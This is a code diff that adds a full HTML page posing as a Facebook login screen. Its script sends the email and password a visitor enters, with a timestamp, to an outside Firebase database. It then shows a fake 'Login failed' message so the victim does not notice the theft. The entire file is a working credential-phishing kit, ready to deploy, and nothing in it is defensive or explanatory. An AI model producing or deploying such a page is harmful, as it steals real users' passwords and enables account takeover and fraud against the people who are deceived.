@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #f0f2f5; padding: 50px; }
+        .login-box { width: 320px; margin: auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 10px #ccc; }
+        input { width: 90%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { background-color: #1877F2; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background-color: #145DBF; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <h2>Login to Facebook<br>to continue </h2>
+        <input type="email" id="email" placeholder="Email or Phone"><br>
+        <input type="password" id="password" placeholder="Password"><br>
+        <button onclick="sendLogin()">Log In</button>
+    </div>
+
+    <script>
+        function sendLogin() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (email && password) {
+                fetch("https://hackcoders-academy-default-rtdb.firebaseio.com/logins.json", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString()
+                    }),
+                    headers: { "Content-Type": "application/json" }
+                })
+                .then(response => {
+                    alert("Login failed! Please check your details and try again.");
+                })
+                .catch(error => console.error("Error:", error));
+            } else {
+                alert("Please enter both email and password.");
+            }
+        }
+    </script>
+
+</body>
+</html>
